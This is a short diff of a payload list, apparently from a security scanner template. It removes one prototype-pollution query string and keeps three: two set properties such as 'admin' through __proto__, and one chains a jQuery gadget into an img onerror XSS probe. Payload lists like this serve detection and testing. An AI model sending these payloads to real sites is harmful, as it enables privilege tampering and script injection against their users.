@@ -1,5 +1,4 @@
 payload:
-  - '/?__proto__[admin]=1'
   - '/?__proto__.admin=1'
   - '/?__proto__[xxx]=alert(1)'
   - '/?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E'
